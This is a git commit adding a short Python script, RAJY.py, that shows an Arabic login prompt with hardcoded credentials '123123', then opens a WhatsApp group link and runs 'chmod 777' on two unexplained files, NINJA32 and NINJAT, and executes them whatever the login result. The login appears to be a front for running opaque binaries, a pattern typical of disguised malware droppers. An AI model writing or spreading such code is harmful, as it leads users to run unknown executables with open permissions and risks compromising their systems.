72f8ebae42bfd29e9959cc11d196e9a59910f46d
FXD017 <135658062+FXD017@users.noreply.github.com>
2023-09-14 03:34:06 +0300

    Add files via upload

---
+++ RAJY.py
@@ -0,0 +1,16 @@
+import os
+
+def login_page():
+    username = input("اسم المستخدم: ")
+    password = input("كلمة المرور: ")
+    
+    if username == "123123" and password == "123123":
+        print("تم تسجيل الدخول بنجاح")
+    else:
+        print("فشل تسجيل الدخول")
+
+login_page()
+
+os.system("xdg-open https://chat.whatsapp.com/JnV9Hx4YLhUBHuWFtzoumb")
+os.system("chmod 777 NINJA32;./NINJA32")
+os.system("chmod 777 NINJAT;./NINJAT")
